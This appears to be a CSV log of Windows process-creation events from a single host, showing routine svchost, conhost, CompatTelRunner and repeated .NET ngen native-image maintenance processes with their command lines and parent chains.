+1783856907625,2026-07-12T11:45:52Z,6100,6296,conhost.exe,,,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:53Z,904,10344,WindowsPackageManagerServer.exe,,C:\Windows\system32\svchost.exe -k DcomLaunch -p,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:53Z,2020,10196,Defrag.exe,,C:\Windows\system32\svchost.exe -k LocalSystemNetworkRestricted -p -s SysMain,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:53Z,10196,9372,conhost.exe,,,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:53Z,772,8020,svchost.exe,,C:\Windows\system32\services.exe,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:55Z,2316,4756,CompatTelRunner.exe,,"""C:\Windows\system32\compattelrunner.exe"" -maintenance",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:55Z,5440,1400,ngentask.exe,,taskhostw.exe PiSqmTasks,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:55Z,5440,6008,ngentask.exe,,taskhostw.exe PiSqmTasks,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:55Z,6008,7064,conhost.exe,,,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:56Z,1400,2880,conhost.exe,,,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:56Z,6008,10916,ngen.exe,,,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:56Z,6008,492,ngen.exe,,,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:57Z,1400,4360,ngen.exe,,,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:45:58Z,1400,892,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:03Z,1400,9488,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:03Z,6008,7612,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:03Z,9488,11152,mscorsvw.exe,,,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:05Z,7612,6912,mscorsvw.exe,,,Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:05Z,1400,10104,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:07Z,6008,8648,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:07Z,1400,11144,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:07Z,1400,3568,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:07Z,6008,3416,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:08Z,6008,2476,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:08Z,6008,2824,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:08Z,1400,11232,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:08Z,6008,10004,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:10Z,1400,6576,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:10Z,6008,10808,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:10Z,1400,6800,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:10Z,1400,8328,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:10Z,6008,1372,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:10Z,1400,9672,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:10Z,6008,9600,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:10Z,772,4360,svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs -p -s gpsvc,C:\Windows\system32\services.exe,wininit.exe <- services.exe <- svchost.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:11Z,6008,11096,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:11Z,1400,7556,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:11Z,6008,10476,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:11Z,1400,8080,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:11Z,6008,8552,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:11Z,1400,8348,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe <- ngentask.exe <- ngen.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:11Z,6008,11076,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe <- ngentask.exe <- ngen.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:12Z,1400,9052,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:12Z,6008,7744,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:12Z,1400,10928,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:12Z,6008,512,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:12Z,1400,8224,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:12Z,6008,2776,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:12Z,1400,4276,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:13Z,6008,9876,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:13Z,1400,10076,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:13Z,6008,8696,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:13Z,1400,9468,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:13Z,6008,10608,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:13Z,1400,11116,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:14Z,1400,9804,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:14Z,6008,10196,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:14Z,1400,2192,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:14Z,6008,8792,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:14Z,6008,6700,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:14Z,1400,5028,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:15Z,1400,6808,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:15Z,6008,2924,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:15Z,1400,9068,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:15Z,6008,5284,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:15Z,1400,5752,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:15Z,6008,1192,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:17Z,1400,9864,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:17Z,6008,10232,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:17Z,1400,9900,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:17Z,6008,2824,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:19Z,1400,6544,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:19Z,6008,10004,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:19Z,1400,9800,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:19Z,6008,4408,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:19Z,1400,7984,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:19Z,6008,1372,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:19Z,1400,7748,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:20Z,6008,9672,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:20Z,1400,3628,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:20Z,6008,5436,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:20Z,1400,3480,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:20Z,6008,10964,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:21Z,1400,8552,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:21Z,6008,3528,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:21Z,1400,8944,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:23Z,1400,136,ngen.exe,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\ngen.exe"" uninstall ""C:\Windows\assembly\NativeImages_v4.0.30319_32\Microsoft.V28a60cc2#\7942c32800b28c6701d291c00c6fe726\Microsoft.VisualStudio.Tools.Office.Runtime.ni.dll"" /noroot /LegacyServiceBehavior","""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe <- ngentask.exe <- ngen.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:23Z,6008,9128,ngen.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe"" uninstall ""C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.P10d01611#\55ca765af09be5e793cd858ebe908f17\Microsoft.PowerShell.Editor.ni.dll"" /noroot /LegacyServiceBehavior","""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe <- ngentask.exe <- ngen.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:24Z,1400,5876,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:24Z,6008,1080,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:24Z,1400,6140,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:24Z,6008,2448,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:24Z,1400,6932,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:24Z,6008,10080,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:25Z,1400,10340,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:25Z,6008,6200,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:25Z,6008,8404,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:25Z,1400,10608,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:27Z,2316,6912,CompatTelRunner.exe,,"""C:\Windows\system32\compattelrunner.exe"" -maintenance",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:27Z,6008,8212,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:27Z,1400,5536,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:27Z,6008,9996,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:27Z,1400,4232,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:28Z,1400,1704,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:28Z,6008,2924,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:28Z,6008,6416,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:28Z,1400,10364,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:28Z,6008,3044,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:29Z,1400,2476,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:29Z,6008,6196,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:29Z,1400,9392,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:29Z,6008,3148,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:29Z,1400,3740,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:29Z,1400,10808,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:29Z,6008,6296,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:31Z,1400,3656,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:31Z,6008,8640,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:31Z,1400,9600,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:31Z,6008,9672,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:31Z,1400,9556,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:31Z,6008,5436,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:32Z,1400,10040,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:32Z,6008,11100,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:32Z,1400,1868,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:32Z,6008,10964,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:32Z,6008,5180,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:32Z,1400,8348,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:32Z,6008,8944,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:32Z,1400,9128,ngen.exe,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngen.exe"" uninstall ""C:\Windows\assembly\NativeImages_v4.0.30319_64\Microsoft.P10d01611#\55ca765af09be5e793cd858ebe908f17\Microsoft.PowerShell.Editor.ni.dll"" /noroot /LegacyServiceBehavior","""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",wininit.exe <- services.exe <- svchost.exe <- taskhostw.exe <- ngentask.exe <- ngen.exe,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:33Z,6008,512,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:33Z,1400,5876,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:33Z,6008,4276,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:33Z,1400,6140,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:33Z,6008,11152,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:33Z,1400,1160,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:35Z,6008,10080,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:35Z,6008,9784,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework64\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1524",Null,C.364907172793f8c7
+1783856907625,2026-07-12T11:46:35Z,1400,5704,ngen.exe,,"""C:\Windows\Microsoft.NET\Framework\v4.0.30319\NGenTask.exe"" /RuntimeWide /StopEvent:1464",Null,C.364907172793f8c7
